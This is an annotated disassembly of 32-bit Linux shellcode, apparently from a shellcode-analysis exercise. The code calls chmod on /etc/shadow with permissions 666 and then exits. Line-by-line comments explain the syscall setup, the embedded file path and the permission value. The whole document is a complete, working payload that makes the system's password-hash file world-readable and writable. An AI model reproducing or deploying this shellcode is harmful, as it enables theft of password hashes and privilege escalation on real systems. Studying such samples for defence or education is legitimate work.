00000000  99                cdq              ; converts doubleword to quadword, zeros out the EDX register
00000001  6A0F              push byte +0xf   ; the value of the chmod syscall (15) is pushed on to the stack 
00000003  58                pop eax          ; chmod syscall
00000004  52                push edx         ; push the null terminator on to the stack 
00000005  E80C000000        call 0x16        ; call the code present at offset 0x16 which contains the file path (/etc/shadow) 
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
00000016  5B                pop ebx          ; pop the memory address that contains the file path (/etc/shadow) into the EBX register [argument 1 for chmod syscal - file path]
00000017  68B6010000        push dword 0x1b6 ; push octal 666 on to the stack (the permissions we are giving to the file [read+write]) [argument 2 for chmod syscall - permissions]
0000001C  59                pop ecx          ; argument 2 for chmod syscall (file permissions) is popped into the ECX register 
0000001D  CD80              int 0x80         ; execute chmod syscall 
0000001F  6A01              push byte +0x1   ; the value of the exit syscall (1) is pushed on to the stack 
00000021  58                pop eax          ; exit syscall
00000022  CD80              int 0x80         ; execute exit syscall
